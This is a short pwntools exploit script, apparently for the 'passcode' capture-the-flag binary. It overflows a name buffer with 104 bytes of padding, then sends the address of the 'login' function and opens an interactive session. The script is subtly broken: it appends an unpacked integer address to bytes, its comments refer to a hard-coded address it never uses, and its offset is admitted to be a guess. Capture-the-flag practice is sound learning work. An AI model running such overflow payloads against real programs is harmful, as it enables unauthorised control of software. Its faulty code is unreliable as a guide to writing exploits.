from pwn import *

# Establish a process or network connection
p = process('passcode') # or remote('hostname', port)
exe = context.binary = ELF('passcode')
# Find the offset (this is hypothetical and should be adjusted based on the actual binary)
offset = 104

# Address to redirect to (hypothetically the start of login function, replace with actual address)
login_func_addr =  exe.symbols['login'] # Replace 0x080484b6 with actual address

# Create payload
payload = b'A' * offset + login_func_addr

# Send payload
p.sendlineafter('enter you name : ', payload)

# Interactive mode to interact with the shell if successfully exploited
p.interactive()
